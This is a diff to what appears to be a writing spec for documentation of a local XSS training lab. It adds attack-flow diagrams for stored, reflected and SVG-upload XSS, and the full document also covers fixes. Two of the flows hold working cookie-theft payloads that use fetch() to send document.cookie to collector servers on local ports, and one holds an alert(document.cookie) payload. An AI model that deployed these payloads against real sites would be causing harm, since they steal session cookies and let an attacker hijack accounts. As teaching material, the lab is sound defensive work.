@@ -809,6 +809,17 @@ Table listing all 9 servers: Port, Server name, File, Status (Vulnerable/Protect
 
 ### Section: Attack 1 — Stored XSS
 
+Start with an **Attack Flow** code block:
+```
+Attacker posts comment containing <script>fetch('//3002?c='+document.cookie)</script>
+        ↓ (stored in DB)
+NovaCRM (3001) renders comments on every page load — no escaping
+        ↓
+Victim visits the page
+        ↓
+Victim's browser executes the script → sends session cookie to attacker server (3002)
+```
+
 Include subsections: What It Is, How to Run (10-step numbered list), Vulnerable Code
 (exact lines with js code blocks), Why These Lines Are Dangerous, Payload Variants,
 The Fix (exact lines), Edge Cases and What Still Fails.
@@ -832,6 +843,17 @@ The Fix (exact lines), Edge Cases and What Still Fails.
 
 ### Section: Attack 2 — Reflected XSS
 
+Start with an **Attack Flow** code block:
+```
+Attacker crafts link: /search?q=<script>alert(document.cookie)</script>
+        ↓ (tricks victim into clicking)
+ShopNest (3003) reflects the raw query parameter into HTML — no escaping
+        ↓
+Victim's browser parses response, executes injected <script>
+        ↓
+Session stolen → exfiltrated to attacker server (3004)
+```
+
 Include subsections: What It Is, How to Run, Vulnerable Code (exact lines), Why These
 Lines Are Dangerous, The Fix (exact lines), Edge Cases.
 
@@ -842,6 +864,18 @@ Include the note on URL encoding:
 > It is NOT a bypass — it is how HTTP always works.
 
 ### Section: Attack 3 — SVG Upload XSS
+
+Start with an **Attack Flow** code block:
+```
+Attacker uploads profile photo: avatar.svg
+  (SVG contains: <script>fetch('//3006?c='+document.cookie)</script>)
+        ↓ (stored as a static file, served at /uploads/avatar.svg)
+Victim views attacker's ConnectHub profile (3005)
+        ↓
+Browser fetches and renders the SVG inline — executes embedded <script>
+        ↓
+Victim's cookie sent to attacker collector (3006)
+```
 
 Include subsections: What It Is, How to Run, Vulnerable Code (exact lines), Why These
 Lines Are Dangerous, The Fix (4-layer stack), Edge Cases.
